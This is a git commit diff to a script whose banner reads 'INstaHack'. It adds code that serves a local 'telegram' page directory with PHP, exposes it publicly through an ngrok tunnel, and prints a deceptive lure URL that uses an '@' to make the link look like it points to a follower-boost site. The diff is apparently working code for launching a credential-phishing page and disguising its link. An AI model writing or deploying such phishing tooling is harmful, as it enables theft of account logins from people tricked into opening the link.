a88a25d1bb089f4ab2d864612781e35de576e8b7
Mobin-Dan <68151748+Mobin-Dan@users.noreply.github.com>
2021-01-11 12:47:54 +0330

    Update module1.py

--- module1.py
+++ module1.py
@@ -1,11 +1,15 @@
 import os
 from colorama import Fore
 import pyfiglet
+from pyngrok import ngrok
+from subprocess import Popen
 print(Fore.GREEN)
 os.system("clear")
 ins =pyfiglet.figlet_format("INstaHack", font="3-d")
 print(Fore.RED+ins)
-print
-print(Fore.GREEN)
-print("Goodbye until the next update:)")
-os.system("php -S localhost:8090 -t telegram")
+with open("server","w") as phplog:
+    Popen(("php","-S","localhost:4040","-t","telegram"),stderr=phplog ,stdout=phplog)
+link=ngrok.connect(4040,"http")
+print(link)
+print(Fore.GREEN+" youcan send link :https://www.instafollowerspro.com@-yourlink")
+input("")
